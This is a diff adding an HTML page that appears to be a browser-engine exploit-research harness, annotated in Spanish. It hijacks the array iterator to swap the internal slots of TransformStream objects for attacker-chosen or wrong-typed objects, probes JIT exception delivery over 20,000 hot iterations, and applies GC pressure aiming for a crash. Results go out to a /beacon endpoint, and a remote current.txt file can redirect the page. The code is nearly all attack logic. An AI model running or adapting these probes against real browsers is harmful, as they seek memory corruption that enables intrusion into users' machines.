@@ -1,0 +1,135 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<script src="runtime-derive/derive-runtime.js"></script>
+<title>FA-v31-combo — press-21: K3-X cruce + TS-alias + JIT exception-delivery + GC-deferido</title></head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-v31-combo…</pre>
+<script>
+(function(){
+"use strict";
+/* FA-v31-combo — press-21: TODO lo vivo en una visita.
+ * S1: TS-aliasing (sustitución slot1 con wrapper-rdX) — 0-crash
+ * S2: K3-X CRUCE promesa↔chunk (valueOf-anidado, delays por chunk) — 0-crash
+ * S3: ★ JIT P3: frame CALIENTE (20k iter → DFG) con try/catch + tee
+ *     full-fill-throw (size==2, catchable). ¿El catch del frame optimizado
+ *     recibe el error CORRECTO las 20k veces? ¿valores corruptos? — 0-crash
+ *     por diseño (nunca trunca: siempre size==2)
+ * S4: TS slot0 deferred: full-fill con slot0 SUSTITUIDO (tipo erróneo) →
+ *     slot0 salvaje almacenado persistente → presión GC → ¿crash-en-GC?
+ *     (letal-ish, ÚLTIMA, armed)
+ * Máxima telemetría. Kit incluido. */
+var RID="v31c"+Date.now().toString(36).slice(-13);
+var out=document.getElementById("out");
+function say(s){try{out.appendChild(document.createTextNode("\n"+s));}catch(e){}}
+function bk(s,b){try{fetch("/beacon/V31-"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,500)})}).catch(function(){});}catch(e){}}
+var HB=setInterval(function(){bk("HB","main-hb");},2000);
+
+var dr="-",rt="-";
+try{ dr=typeof window.deriveRuntime; rt=(dr==="object"&&window.deriveRuntime)?typeof window.deriveRuntime.run:"-"; }catch(e){}
+bk("L","v31-combo; dr="+dr+"; rt="+rt);
+
+var OI=Array.prototype[Symbol.iterator];
+function rst(){try{Array.prototype[Symbol.iterator]=OI;}catch(e){}}
+function poi(a){Array.prototype[Symbol.iterator]=function(){var i=0;return{next:function(){if(i>=a.length)return{done:true};var v=a[i];i++;return{value:v,done:false};}};};}
+
+/* S2 (primero la de promesas — necesita await) — K3-X CRUCE con delays */
+(function(){
+  var log=[];
+  try{
+    var SIZE_CALLS=0;
+    var w=new WritableStream({
+      write:function(ch){ return new Promise(function(res){ setTimeout(res, ch==="C2"?300:10); }); }
+    },{ size:function(ch){
+      SIZE_CALLS++;
+      if(SIZE_CALLS===1){
+        /* valueOf-window: write ANIDADO durante el size() del primero */
+        try{ window.__nestedP = window.__wr.write("C2"); }catch(e){}
+      }
+      return 1;
+    }});
+    window.__wr = w.getWriter();
+    var p1 = window.__wr.write("C1");
+    var t0=Date.now(), setO=[];
+    p1.then(function(){ setO.push("p1@"+(Date.now()-t0)); fin2(); });
+    if(window.__nestedP){ window.__nestedP.then(function(){ setO.push("p2@"+(Date.now()-t0)); fin2(); }); }
+    var done2=false;
+    function fin2(){ if(done2||setO.length<2)return; done2=true;
+      bk("S2","setO=["+setO.join(",")+"] (cruce: p1@~300 · no-cruce: p1@~10)"); }
+    setTimeout(function(){ if(!done2){ bk("S2","timeout;setO=["+setO.join(",")+"]"); } },1200);
+  }catch(e){ bk("S2","E:"+String((e&&e.message)||e).slice(0,60)); }
+})();
+
+/* S1 — TS-aliasing: sustituir slot1 del triple con nuestro wrapper */
+(function(){
+  var m="E",e1="",idSame="-",xLk="-",dLk="-";
+  try{
+    var CAP=null;
+    Array.prototype[Symbol.iterator]=function(){var t=this;
+      try{ if(CAP===null&&t&&t.length===3) CAP=[t[0],t[1],t[2]]; }catch(e){}
+      var i=0;return{next:function(){if(i>=t.length)return{done:true};var v=t[i];i++;return{value:v,done:false};}};};
+    var ts=new TransformStream({}); rst();
+    if(CAP){
+      idSame=String(ts.readable===CAP[1]);
+      /* ahora un NUEVO TS con slot1 = NUESTRO objeto X */
+      var X={tag:"ours"};
+      poi([CAP[0],X,CAP[2]]);
+      var ts2=null;
+      try{ ts2=new TransformStream({}); m="ok"; }catch(e2){ e1=String((e2&&e2.message)||e2).slice(0,40); m="E"; }
+      rst();
+      if(ts2){ try{ xLk=String(ts2.readable===X); }catch(e){} try{ dLk=String(ts2.writable===CAP[2]); }catch(e){} }
+    } else { m="noCAP"; }
+  }catch(e){ rst(); e1=String((e&&e.message)||e).slice(0,40); }
+  bk("S1","sub="+m+";e="+e1+";idSame="+idSame+";readableEsX="+xLk+";writableEsCapturado="+dLk);
+})();
+
+/* S3 — ★ JIT P3: frame caliente con try/catch + tee full-fill-throw */
+(function(){
+  bk("armed-3","JIT: 20k iter calientes, catch debe recibir CTRL-JIT siempre");
+  function hot(n){
+    var ok=0, bad=0, weird=[];
+    function fullFillThrow(){ Array.prototype[Symbol.iterator]=function(){ var t=this,i=0; return { next:function(){ i++; if(i<=t.length) return {value:t[i-1],done:false}; throw new Error("CTRL-JIT"); }};}; }
+    for(var k=0;k<n;k++){
+      try{
+        fullFillThrow();
+        new ReadableStream({}).tee();
+        Array.prototype[Symbol.iterator]=OI;
+        bad++; /* no tiró = raro */
+      }catch(e){
+        Array.prototype[Symbol.iterator]=OI;
+        var m=String((e&&e.message)||e);
+        if(m==="CTRL-JIT"){ ok++; }
+        else { bad++; if(weird.length<3) weird.push(m.slice(0,30)); }
+      }
+    }
+    return "ok="+ok+";bad="+bad+";weird=["+weird.join("|")+"]";
+  }
+  var r="-";
+  try{ r=hot(20000); }catch(e){ r="E:"+String((e&&e.message)||e).slice(0,50); }
+  bk("S3",r+" (ok=20000 = JIT sano; bad>0 o weird = entrega de excepción corrupta en frame optimizado)");
+})();
+
+/* S4 — TS slot0 sustituido (tipo erróneo, full-fill) + presión GC (deferred) */
+bk("armed-4","TS slot0 sustituido + presión GC — si no hay S4-survivor, murio en GC-visit");
+(function(){
+  var m="E",e1="";
+  try{
+    var CAP=null;
+    Array.prototype[Symbol.iterator]=function(){var t=this;
+      try{ if(CAP===null&&t&&t.length===3) CAP=[t[0],t[1],t[2]]; }catch(e){}
+      var i=0;return{next:function(){if(i>=t.length)return{done:true};var v=t[i];i++;return{value:v,done:false};}};};
+    new TransformStream({}); rst();
+    if(CAP){
+      var NOTANITS={soy:"un objeto cualquiera, no un InternalTransformStream"};
+      poi([NOTANITS,CAP[1],CAP[2]]);
+      var tsB=null;
+      try{ tsB=new TransformStream({}); m="ok"; }catch(e2){ e1=String((e2&&e2.message)||e2).slice(0,40); m="E"; }
+      rst();
+      bk("S4-ctor","new="+m+";e="+e1+";tsB="+(tsB?typeof tsB:"-"));
+      /* presión GC: que el GC-visit toque el slot0 salvaje */
+      var j=[]; for(var i=0;i<5000;i++){ j.push({a:i,b:[i]}); }
+      bk("S4-survivor","presionGC=5000 objs; main VIVA tras GC-visit; tsB="+(tsB?(typeof tsB.readable):"-"));
+    } else { bk("S4-survivor","noCAP"); }
+  }catch(e){ rst(); bk("S4-survivor","E:"+String((e&&e.message)||e).slice(0,50)); }
+})();
+
+setTimeout(function(){ rst(); clearInterval(HB); bk("Z","FA-v31-combo complete"); },3000);
+})();
+</script></body></html>
